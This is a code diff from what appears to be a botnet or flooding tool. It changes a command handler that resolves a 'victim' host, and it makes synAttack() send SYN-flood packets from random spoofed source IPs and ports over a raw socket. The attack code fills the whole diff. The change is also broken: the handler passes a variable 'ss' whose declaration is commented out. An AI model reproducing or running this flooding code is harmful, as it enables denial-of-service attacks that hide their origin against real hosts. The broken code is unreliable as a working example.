@@ -166,7 +166,17 @@ void parseCommand(char command[])
         hostinfo = gethostbyname(victim);
         sprintf(victim_ip,"%s",inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
         cout << victim_ip << endl;
-        synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
+        
+        string s="";
+        int port = 0;
+        /*int p1=rand()%256;
+        int p2=rand()%256;
+        int p3=rand()%256;
+        int p4=rand()%256;
+        int port=rand()%65536;*/
+        //string ss=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
+        synAttack(ss, port, victim_ip, 80, 3);
+        //synAttack("192.168.1.2", 22000, victim_ip, 80, 3);
         cout << "Done" << endl;
     }
     else
@@ -203,6 +213,15 @@ unsigned short csum(unsigned short *ptr,int nbytes)
 void synAttack(string sourceIP, int sourcePort, string destIP, int destPort, int durTime)
 {
 	// Create a raw socket;
+    
+    int p1=rand()%256;
+    int p2=rand()%256;
+    int p3=rand()%256;
+    int p4=rand()%256;
+    sourcePort=rand()%65536;
+    sourceIP=to_string(p1)+"."+to_string(p2)+"."+to_string(p3)+"."+to_string(p4);
+
+    
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
 
 	if(s == -1)
